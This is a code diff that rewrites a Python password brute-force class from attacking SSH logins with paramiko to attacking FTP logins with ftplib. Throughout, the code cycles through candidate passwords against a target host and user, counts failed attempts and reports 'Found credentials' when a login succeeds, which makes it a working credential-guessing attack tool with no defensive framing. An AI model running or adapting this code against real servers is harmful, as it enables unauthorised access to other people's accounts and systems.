@@ -1,31 +1,23 @@
-import paramiko
+import ftplib
 from target import Target, Attacker
 
 
-class SSHAttacker(Attacker):
+class FTPAttacker(Attacker):
     def __init__(self, target: Target):
         super().__init__(target)
 
     def try_connect(self, password):
         try:
-            sshclient = paramiko.SSHClient()
-            sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-            sshclient.connect(
-                hostname=self.target.host,
-                port=self.target.port,
-                username=self.target.login,
-                timeout=3,
-                password=password,
-                allow_agent=False,
-                look_for_keys=False
-            )
-        except paramiko.AuthenticationException:
+            ftpclient = ftplib.FTP()
+            ftpclient.connect(self.target.host, self.target.port)
+            ftpclient.login(self.target.login, password)
+            ftpclient.quit()
+        except ftplib.error_perm:
             self.tries += 1
             print("[%s] Failed attempt against %s - user: %s, password: %s" %
                   (self.name, self.target.host, self.target.login, password))
             return True
-        except paramiko.SSHException:
+        except OSError:
             print("[%s] Connection error - %s" % (self.name, self.target.host))
             return False
         except Exception:
@@ -34,20 +26,20 @@ class SSHAttacker(Attacker):
             return False
         else:
             self.tries += 1
-            SSHAttacker.finish = True
-            SSHAttacker.password = password
-            SSHAttacker.success = True
+            FTPAttacker.finish = True
+            FTPAttacker.password = password
+            FTPAttacker.success = True
             print("[%s] Found credentials for %s - user: %s, password: %s" %
                   (self.name, self.target.host, self.target.login, password))
             return True
         finally:
-            sshclient.close()
+            ftpclient.close()
 
     def run(self):
-        while SSHAttacker.finish is False:
+        while FTPAttacker.finish is False:
             password = self.get_password()
             if password is None:
                 continue
 
-            while self.try_connect(password) is False and SSHAttacker.finish is False:
+            while self.try_connect(password) is False and FTPAttacker.finish is False:
                 pass
